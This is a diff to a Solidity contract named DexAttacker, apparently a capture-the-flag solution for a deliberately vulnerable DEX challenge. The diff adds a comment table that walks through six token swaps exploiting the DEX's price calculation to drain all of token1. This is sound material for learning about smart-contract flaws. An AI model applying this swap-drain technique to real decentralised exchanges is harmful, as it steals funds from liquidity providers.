@@ -27,6 +27,18 @@ contract DexAttacker {
         challengeInstance = _challengeInstance;
     }
 
+    /** 
+    *     Step  |       DEX       |      Player  
+    *           | token1 - token2 | token1 - token2 
+    *   ---------------------------------------------
+    *     Init  |   100     100   |    10      10    
+    *   Swap 1  |   110      90   |     0      20    
+    *   Swap 2  |    86     110   |    24       0    
+    *   Swap 3  |   110      80   |     0      30    
+    *   Swap 4  |    69     110   |    41       0
+    *   Swap 5  |   110      45   |     0      65   
+    *   Swap 6  |     0      90   |   110      20
+    */
     function attack() external {
         (address token1, address token2) = (IDex(challengeInstance).token1(), IDex(challengeInstance).token2());
         IERC20(token1).transferFrom(msg.sender, address(this), 10);
